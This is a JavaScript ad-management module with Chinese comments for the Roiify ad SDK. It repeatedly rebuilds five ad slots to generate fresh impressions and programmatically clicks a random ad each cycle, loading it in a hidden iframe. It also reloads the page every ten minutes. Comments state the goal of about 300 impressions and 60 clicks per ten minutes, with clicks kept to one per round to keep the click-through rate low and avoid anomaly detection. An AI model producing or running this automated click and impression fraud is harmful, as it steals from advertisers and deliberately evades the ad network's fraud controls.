// ============================================================
// Roiify 广告管理模块 - 修复监听器累积版
//
// 根因：show() 在同一元素上反复调用 → M() 累积 click 监听器 + setInterval
// 75轮后每个slot有75个监听器，点击触发75个POST /ad/impression（大部分旧token被拒）
//
// 修复：每次创建新子div + refresh()，旧div移除时监听器随之消亡
//
// SDK 关键逻辑：
// - refresh() = init() = k()：扫描所有 [data-roiify-placement]，跳过 loaded=1
// - 展示确认：连续2秒可见 → POST /ad/impression
// - 点击也触发展示确认（capture监听）
// - M() 的监听器加在广告容器元素上，元素移除则监听器消亡
// ============================================================

var AdManager = (function () {
    var PLACEMENT_IDS = [
        'plc_cuqpbscc2mu4',
        'plc_mdn2c7brmubq',
        'plc_veoj4xd63gvk',
        'plc_xz7j9zet6udj',
        'plc_2450suzhskwx'
    ];

    // SDK需2秒连续可见，等5秒确保广告加载+展示确认完成
    var WAIT_FOR_IMPRESSION = 5000;

    // 点击后等待收益转换
    var WAIT_AFTER_CLICK = 5000;

    // 每轮点击1个（降低CTR避免异常）
    var CLICK_COUNT = 1;

    // 页面重定向间隔 - 10分钟
    var REDIRECT_INTERVAL = 600000;

    var roundCount = 0;

    function init() {
        waitForSDK(function () {
            doCycle();
        });
        setTimeout(function () {
            location.reload();
        }, REDIRECT_INTERVAL);
    }

    function waitForSDK(callback) {
        if (window.RoiifyAds) {
            callback();
            return;
        }
        var check = setInterval(function () {
            if (window.RoiifyAds) {
                clearInterval(check);
                callback();
            }
        }, 300);
    }

    /**
     * 完整周期：刷新 → 等5秒(展示确认) → 点击1个 → 等5秒 → 下一轮
     * 每轮约10秒，10分钟 ≈ 60轮 = 300次有效展示 + 60次点击
     */
    function doCycle() {
        roundCount++;
        refreshAllSlots();

        setTimeout(function () {
            clickRandomAds();
            setTimeout(function () {
                doCycle();
            }, WAIT_AFTER_CLICK);
        }, WAIT_FOR_IMPRESSION);
    }

    /**
     * 刷新所有广告位
     *
     * 关键：每次创建新的子div，而非用show()在同一元素上反复调用
     * - 旧子div被innerHTML=''移除时，其上的click监听器和setInterval随之消亡
     * - 新子div没有loaded标记，refresh()会加载它
     * - 避免监听器累积（之前75轮后每slot有75个监听器）
     */
    function refreshAllSlots() {
        PLACEMENT_IDS.forEach(function (placement, index) {
            var slot = document.getElementById('ad-slot-' + index);
            if (!slot) return;

            // 移除旧子div（及其所有监听器和定时器）
            slot.innerHTML = '';

            // 创建新子div - 无loaded标记，refresh()会加载它
            var adDiv = document.createElement('div');
            adDiv.setAttribute('data-roiify-placement', placement);
            adDiv.setAttribute('data-theme', 'auto');
            adDiv.setAttribute('data-width', 'auto');
            adDiv.setAttribute('data-radius', '4');

            slot.appendChild(adDiv);
        });

        // refresh() = init() = k()：扫描所有 [data-roiify-placement]
        // 跳过 loaded=1 的，只加载新创建的子div
        if (window.RoiifyAds && window.RoiifyAds.refresh) {
            try {
                RoiifyAds.refresh();
            } catch (e) {}
        }
    }

    /**
     * 点击1个随机广告
     * SDK创建的 <a target="_blank"> → 覆盖target为隐藏iframe → link.click()
     * 点击触发M()的capture监听 → 立即发送展示确认
     * 浏览器导航到clickUrl → 服务端记录点击 → 302到广告主
     */
    function clickRandomAds() {
        var slotIndex = Math.floor(Math.random() * PLACEMENT_IDS.length);
        var slot = document.getElementById('ad-slot-' + slotIndex);
        if (!slot) return;

        var link = slot.querySelector('a[href]');
        if (!link) return;

        link.target = 'ad_click_frame';

        try {
            link.click();
        } catch (e) {}
    }

    function onModalOpen() {
        refreshAllSlots();
    }

    function onGameAction() {
        refreshAllSlots();
    }

    return {
        init: init,
        onModalOpen: onModalOpen,
        onGameAction: onGameAction
    };
})();
